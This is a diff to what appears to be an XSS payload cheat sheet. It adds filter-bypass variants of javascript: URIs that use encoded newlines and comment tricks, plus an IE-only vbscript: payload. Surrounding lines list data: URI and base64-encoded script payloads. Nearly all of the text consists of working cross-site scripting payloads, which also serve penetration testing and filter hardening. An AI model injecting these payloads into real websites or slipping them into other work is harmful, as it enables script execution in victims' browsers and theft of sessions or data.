@@ -113,6 +113,9 @@ java%0dscript:alert(1)   - CR (\r)
 Using the escape character
  \j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
 
+Using the newline and a comment //
+javascript://%0Aalert(1)
+javascript://anything%0D%0A%0D%0Awindow.alert(1)
 ```
 
 XSS with data:
@@ -121,7 +124,10 @@ data:text/html,<script>alert(0)</script>
 data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
 ```
 
-
+XSS with vbscript: only IE
+```
+vbscript:msgbox("XSS")
+```
 ## XSS in files
 XSS in XML
 ```
